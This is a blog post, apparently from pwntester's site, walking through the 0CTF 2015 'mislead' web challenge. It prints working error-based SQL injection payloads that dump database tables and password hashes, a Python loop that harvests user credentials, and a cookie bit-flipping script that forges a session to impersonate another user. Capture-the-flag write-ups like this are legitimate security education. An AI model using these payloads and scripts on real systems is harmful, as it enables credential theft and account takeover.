@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>0CTF 2015 - mislead (web 300)</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="We are welcomed with a login page where we can register a new account and log in with it. After logging to the application we received a:
+Hello pwntester. Try to login as 0ops!  The first thing I looked for was for SQL injection in the register and login forms. The register one turned to be injectable and we can use Duplicate entry technique to dump the DB:
+Get the DB:">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="0CTF 2015 - mislead (web 300)">
+    <meta name="twitter:description" content="We are welcomed with a login page where we can register a new account and log in with it. After logging to the application we received a:
+Hello pwntester. Try to login as 0ops!  The first thing I looked for was for SQL injection in the register and login forms. The register one turned to be injectable and we can use Duplicate entry technique to dump the DB:
+Get the DB:">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="0CTF 2015 - mislead (web 300)">
+  <meta property="og:description" content="We are welcomed with a login page where we can register a new account and log in with it. After logging to the application we received a:
+Hello pwntester. Try to login as 0ops!  The first thing I looked for was for SQL injection in the register and login forms. The register one turned to be injectable and we can use Duplicate entry technique to dump the DB:
+Get the DB:">
+  <meta property="og:url" content="http://pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">0CTF 2015 - mislead (web 300)</h1>
+      <p class="post-meta">@pwntester · Mar 30, 2015 · 4 min read</p>
+    </header>
+    <article class="post-content"><p>We are welcomed with a login page where we can register a new account and log in with it.
+After logging to the application we received a:</p>
+
+<pre><code class="language-lang-raw">Hello pwntester. Try to login as 0ops!
+</code></pre>
+
+<p>The first thing I looked for was for SQL injection in the register and login forms. The register one turned to be injectable and we can use Duplicate entry technique to dump the DB:</p>
+
+<p>Get the DB:</p>
+
+<pre><code class="language-lang-raw">username=pwner10&amp;password='),(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) );#&amp;submit=Submit
+</code></pre>
+
+<p>Output:</p>
+
+<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'mislead1' for key 'group_key'&lt;br&gt;maybe another username?
+</code></pre>
+
+<p>Get the tables:</p>
+
+<pre><code class="language-lang-raw">username=pwner10&amp;password='),(select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+ );#&amp;submit=Submit
+</code></pre>
+
+<p>Output:</p>
+
+<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'users~1' for key 'group_key'&lt;br&gt;maybe another username?
+</code></pre>
+
+<p>Get the columns:</p>
+
+<pre><code class="language-lang-raw">username=pwner10&amp;password='),(select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  );#&amp;submit=Submit
+</code></pre>
+
+<p>Output:</p>
+
+<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'id~1' for key 'group_key'&lt;br&gt;maybe another username?
+
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'username~1' for key 'group_key'&lt;br&gt;maybe another username?
+
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'password~1' for key 'group_key'&lt;br&gt;maybe another username?
+</code></pre>
+
+<p>Get the first user:</p>
+
+<pre><code class="language-lang-raw"> username=pwner10&amp;password='),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   );#&amp;submit=Submit
+</code></pre>
+
+<p>Output:</p>
+
+<pre><code class="language-lang-raw">SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0ops~13096de41fe9a97b700d4d9e21665484~1' for key 'group_key'&lt;br&gt;maybe another username?
+</code></pre>
+
+<p>YAY! We have the <code>MD5</code> for 0ops&rsquo;s password, we crack it, log in as 0ops and get our flag, easy, isnt it? Well, nope. MD5 is not in any hash DB, so we are back where we started.</p>
+
+<p>One thing stands out when looking at the request:</p>
+
+<pre><code class="language-lang-raw">GET /mislead/index.php HTTP/1.1
+Host: 202.112.26.101
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: auth=YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA%3D%3D
+Referer: http://202.112.26.101/mislead/login.php
+Connection: keep-alive
+</code></pre>
+
+<p>Its a php application but its not using PHPSESSIONs but a custom <code>Auth</code>instead. This cookie is encoded in <code>base64</code> and then encoded in <code>hexadecimal</code>. But there is no useful info for us. We can assume that the cookie keeps the application state including the user associated to the session.</p>
+
+<p>At this point, we decide to flip bits in the cookie to see if some changes/break and at some byte(14), the logging message changes and our names is modified. Cool! So we can try to bit-flip the cookie and get the username to be 0ops. For that, the easiest way is to register a name very similar (just one letter off) and bit-flip that byte until we get the right name.</p>
+
+<p>All the usernames I tried were already picked so I started to think that someone register all those users once they got the flag (sign that we are in the right direction). I used the useless SQLi to pwn the pwners:</p>
+
+<pre><code class="language-lang-python">import requests
+url = 'http://202.112.26.101//mislead/register.php'
+for i in xrange(4000):
+	data = {
+		'username': 'pwntester',
+		'password': &quot;'),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a));#&quot; % i,
+		'submit': 'Submit',
+	}
+	res = requests.post(url, data=data)
+	if &quot;ops~&quot; in res.text:
+		print res.text
+</code></pre>
+
+<p>We get:</p>
+
+<pre><code class="language-lang-raw">~/CTFs/tasks/0CTF2k15/mislead&gt; python pwn.py
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0ops~13096de41fe9a97b700d4d9e21665484~1' for key 'group_key'&lt;br&gt;maybe another username?
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ' 0ops~698d51a19d8a121ce581499d7b701668~1' for key 'group_key'&lt;br&gt;maybe another username?
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'Oops~c8837b23ff8aaa8a2dde915473ce0991~1' for key 'group_key'&lt;br&gt;maybe another username?
+</code></pre>
+
+<p>Ok, I will use <code>Oops</code> (Capital O) if md5 is easy to crack which it is <code>123321</code></p>
+
+<p>Now, log with this user and get the cookie:</p>
+
+<pre><code class="language-lang-raw">YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA==
+</code></pre>
+
+<p>Using the following script, we can get the flag:</p>
+
+<pre><code class="language-lang-python">import requests
+from base64 import b64decode, b64encode
+from hexdump import hexdump
+import sys
+import string
+
+url = 'http://202.112.26.101//mislead/index.php'
+OopsCookie = 'YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA=='
+binCookie = b64decode(OopsCookie).decode(&quot;hex&quot;)
+bytelength = len(binCookie)
+
+def is_printable(s):
+	for ch in s:
+		if not ch in string.printable:
+			return False
+	return True
+
+def flip_byte(msg, pos, byte=0x10):
+	msg = msg[:pos] + chr(ord(msg[pos]) ^ byte) + msg[pos+1:]
+	return msg
+
+for i in xrange(bytelength):
+	res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i).encode(&quot;hex&quot;))})
+	print i, res.text
+	if &quot;Hello&quot; in res.text and &quot;Oops&quot; not in res.text:
+		for c in xrange(256):
+			res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i, c).encode(&quot;hex&quot;))})
+			if is_printable(res.text):
+				print i, c, res.text
+</code></pre>
+
+<p>Output is:</p>
+
+<pre><code class="language-lang-raw">14 112 Hello ?ops. Try to login as 0ops!
+14 113 Hello &gt;ops. Try to login as 0ops!
+14 114 Hello =ops. Try to login as 0ops!
+14 115 Hello &lt;ops. Try to login as 0ops!
+14 116 Hello ;ops. Try to login as 0ops!
+14 117 Hello :ops. Try to login as 0ops!
+14 118 Hello 9ops. Try to login as 0ops!
+14 119 Hello 8ops. Try to login as 0ops!
+14 120 Hello 7ops. Try to login as 0ops!
+14 121 Hello 6ops. Try to login as 0ops!
+14 122 Hello 5ops. Try to login as 0ops!
+14 123 Hello 4ops. Try to login as 0ops!
+14 124 Hello 3ops. Try to login as 0ops!
+14 125 Hello 2ops. Try to login as 0ops!
+14 126 Hello 1ops. Try to login as 0ops!
+14 127 Welcome to the 0ops secret place!&lt;br&gt;Just get your flag here :)&lt;br&gt;0ctf{w3_musT_kn0w_S0Me_crYpt0gr4phY}
+</code></pre>
+
+<p>FLAG is: <code>0ctf{w3_musT_kn0w_S0Me_crYpt0gr4phY}</code></p>
+</article>
+    <footer class="post-footer">
+      
+      <p class="post-copyright">
+        This post was published <strong>1668</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
